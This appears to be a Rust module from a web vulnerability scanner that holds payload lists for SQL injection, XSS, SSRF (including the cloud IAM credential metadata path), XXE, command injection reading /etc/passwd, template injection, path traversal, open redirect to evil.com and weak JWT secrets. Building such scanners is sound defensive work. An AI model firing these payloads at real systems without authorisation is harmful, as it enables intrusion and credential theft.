//! Curated payload databases for every supported vulnerability class.

// ─── SQL Injection ────────────────────────────────────────────────────────────

/// Single-quote / syntax-break payloads — trigger DB error messages.
pub const SQLI_ERROR_PAYLOADS: &[&str] = &[
    "'",
    "''",
    "`",
    "\"",
    "\\",
    "';",
    "\");",
    "1'",
    "1\"",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "\" OR 1=1--",
    "1; SELECT 1--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
    "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
];

/// SQL error patterns to match in responses (case-insensitive).
pub const SQLI_ERROR_PATTERNS: &[&str] = &[
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "syntax error at or near",
    "pg::syntaxerror",
    "invalid column name",
    "sqlstate",
    "ora-01756",
    "ora-00933",
    "ora-00907",
    "microsoft ole db provider for sql server",
    "microsoft jet database engine",
    "odbc microsoft access",
    "jdbc exception",
    "invalid sql statement",
    "column count doesn't match value count",
    "sqlite_error",
    "sqlite3.operationalerror",
    "unknown column",
    "operationalerror: near",
    "pdo exception",
    "pdoexception",
    "nativeerror",
    "db2 sql error",
    "cli driver",
];

/// Boolean-based blind payloads — TRUE vs FALSE condition pairs.
/// Each tuple is (true_payload, false_payload).
pub const SQLI_BOOL_PAIRS: &[(&str, &str)] = &[
    ("' OR '1'='1'--", "' OR '1'='2'--"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("\" AND 1=1--", "\" AND 1=2--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND 'a'='a", "1' AND 'a'='b"),
];

/// Time-based blind payloads — delay 5 seconds.
pub const SQLI_TIME_PAYLOADS: &[(&str, u64)] = &[
    ("'; WAITFOR DELAY '0:0:5'--", 4500),          // MSSQL
    ("'; SELECT SLEEP(5)--", 4500),                  // MySQL
    ("'; SELECT pg_sleep(5)--", 4500),               // PostgreSQL
    ("' OR SLEEP(5)--", 4500),
    ("1; WAITFOR DELAY '0:0:5'--", 4500),
    ("1 AND SLEEP(5)", 4500),
];

// ─── XSS ─────────────────────────────────────────────────────────────────────

/// XSS probe payloads — use a unique nonce embedded so reflection can be verified.
pub const XSS_CONTEXT_PAYLOADS: &[&str] = &[
    "<script>alert('{nonce}')</script>",
    "<img src=x onerror=alert('{nonce}')>",
    "\"><script>alert('{nonce}')</script>",
    "'><script>alert('{nonce}')</script>",
    "<svg/onload=alert('{nonce}')>",
    "javascript:alert('{nonce}')",
    "<body onload=alert('{nonce}')>",
    "'-alert('{nonce}')-'",
    "\";alert('{nonce}')//",
    "<!--<script>alert('{nonce}')</script>-->",
    "<details/open/ontoggle=alert('{nonce}')>",
    "<audio src=x onerror=alert('{nonce}')>",
    "<video src=x onerror=alert('{nonce}')>",
    "<input autofocus onfocus=alert('{nonce}')>",
    "<select autofocus onfocus=alert('{nonce}')>",
    "<textarea autofocus onfocus=alert('{nonce}')>",
    "<keygen autofocus onfocus=alert('{nonce}')>",
    "<iframe srcdoc=\"<script>alert('{nonce}')</script>\">",
];

// ─── SSRF ─────────────────────────────────────────────────────────────────────

/// Cloud provider metadata endpoints for SSRF testing.
pub const SSRF_CLOUD_TARGETS: &[&str] = &[
    "http://169.254.169.254/latest/meta-data/",             // AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",  // GCP
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01", // Azure
    "http://100.100.100.200/latest/meta-data/",             // Alibaba Cloud
    "http://localhost/",
    "http://127.0.0.1/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://0/",
    "http://2130706433/",            // 127.0.0.1 as integer
    "http://0x7f000001/",            // 127.0.0.1 as hex
    "http://017700000001/",          // 127.0.0.1 as octal
];

// ─── XXE ─────────────────────────────────────────────────────────────────────

pub const XXE_PAYLOADS: &[&str] = &[
    r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#,
    r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>"#,
    r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oast}/xxe">]><foo>&xxe;</foo>"#,
    r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oast}/xxe">%xxe;]><foo>test</foo>"#,
];

pub const XXE_RESPONSE_INDICATORS: &[&str] = &[
    "root:x:",
    "root:0:0",
    "/bin/bash",
    "/bin/sh",
    "daemon:x:",
];

// ─── Command Injection ────────────────────────────────────────────────────────

/// Each tuple: (payload, response_indicator).
pub const CMDI_PAYLOADS: &[(&str, &str)] = &[
    ("; cat /etc/passwd", "root:"),
    ("| cat /etc/passwd", "root:"),
    ("|| cat /etc/passwd", "root:"),
    ("& cat /etc/passwd", "root:"),
    ("&& cat /etc/passwd", "root:"),
    ("`cat /etc/passwd`", "root:"),
    ("$(cat /etc/passwd)", "root:"),
    ("\ncat /etc/passwd", "root:"),
    // Windows
    ("& type C:\\Windows\\win.ini", "[fonts]"),
    ("| type C:\\Windows\\win.ini", "[fonts]"),
    ("&& type C:\\Windows\\win.ini", "[fonts]"),
];

/// Time-based command injection: inject a sleep and measure latency.
pub const CMDI_TIME_PAYLOADS: &[(&str, u64)] = &[
    ("; sleep 5", 4500),
    ("| sleep 5", 4500),
    ("& sleep 5", 4500),
    ("\nsleep 5", 4500),
    ("$(sleep 5)", 4500),
    ("`sleep 5`", 4500),
    (" ping -c 5 127.0.0.1", 4000),
];

// ─── SSTI ─────────────────────────────────────────────────────────────────────

/// Each tuple: (payload, expected_output_contains).
pub const SSTI_PAYLOADS: &[(&str, &str)] = &[
    ("{{7*7}}", "49"),            // Jinja2 / Twig / generic
    ("${7*7}", "49"),             // Freemarker / Thymeleaf
    ("<%= 7*7 %>", "49"),         // ERB / EJS
    ("#{7*7}", "49"),             // Ruby ERB alternate
    ("{{7*'7'}}", "7777777"),     // Jinja2 string multiply
    ("@(7*7)", "49"),             // Razor / C#
    ("*{7*7}", "49"),             // Spring SpEL (Thymeleaf)
    ("${{7*7}}", "49"),           // Java EL
    ("{7*7}", "49"),              // Generic
    ("{{config}}", "SECRET_KEY"), // Jinja2 Flask config leak
    ("{{self}}", "<TemplateReference"),
];

// ─── Path Traversal ───────────────────────────────────────────────────────────

pub const PATH_TRAVERSAL_PAYLOADS: &[&str] = &[
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..//..//..//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "/etc/passwd",
    "..\\..\\..\\Windows\\win.ini",
    "..%5c..%5c..%5cWindows%5cwin.ini",
    "../../../../../../../../etc/passwd",
    "/../../../../etc/passwd",
    "file:///etc/passwd",
];

pub const PATH_TRAVERSAL_INDICATORS: &[&str] = &[
    "root:x:",
    "root:0:0",
    "daemon:x:",
    "/bin/bash",
    "[fonts]",    // Windows win.ini
    "; for 16-bit app support",
];

// ─── Open Redirect ────────────────────────────────────────────────────────────

pub const REDIRECT_PAYLOADS: &[&str] = &[
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com@legitimate.com",
    "https://legitimate.com.evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "%2F%2Fevil.com",
    "http://evil.com",
];

pub const REDIRECT_PARAMS: &[&str] = &[
    "redirect", "url", "next", "return", "returnUrl", "returnTo",
    "goto", "destination", "continue", "forward", "target",
    "redirect_uri", "redirect_url", "callback", "next_url", "redir",
    "location", "dest", "jump", "from", "to", "link", "ref",
];

// ─── CORS ─────────────────────────────────────────────────────────────────────

pub const CORS_TEST_ORIGINS: &[&str] = &[
    "https://evil.com",
    "null",
    "https://attacker.com",
];

// ─── JWT ──────────────────────────────────────────────────────────────────────

/// Weak/common JWT secrets to try.
pub const JWT_WEAK_SECRETS: &[&str] = &[
    "secret", "password", "123456", "test", "key", "jwt_secret",
    "mysecret", "changeme", "admin", "secret123", "qwerty",
    "letmein", "12345678", "password123", "secret_key", "app_secret",
    "", "null", "undefined",
];

// ─── Security Headers ─────────────────────────────────────────────────────────

pub const REQUIRED_SECURITY_HEADERS: &[(&str, &str)] = &[
    ("strict-transport-security", "Missing HSTS header"),
    ("x-content-type-options", "Missing X-Content-Type-Options header"),
    ("x-frame-options", "Missing X-Frame-Options header"),
    ("content-security-policy", "Missing Content-Security-Policy header"),
    ("referrer-policy", "Missing Referrer-Policy header"),
    ("permissions-policy", "Missing Permissions-Policy header"),
];

pub const DANGEROUS_HEADERS: &[(&str, &str)] = &[
    ("server", "Server version disclosed"),
    ("x-powered-by", "Technology stack disclosed"),
    ("x-aspnet-version", "ASP.NET version disclosed"),
    ("x-aspnetmvc-version", "ASP.NET MVC version disclosed"),
];

// ─── Generic fuzz characters ─────────────────────────────────────────────────

pub const FUZZ_CHARS: &[&str] = &[
    "'", "\"", "<", ">", ";", "&", "|", "`", "$", "(", ")", "{", "}",
    "[", "]", "\\", "/", ".", ",", ":", "=", "+", "-", "*", "#", "@",
    "!", "?", "%", "^", "~", " ", "\t", "\n", "\r",
];
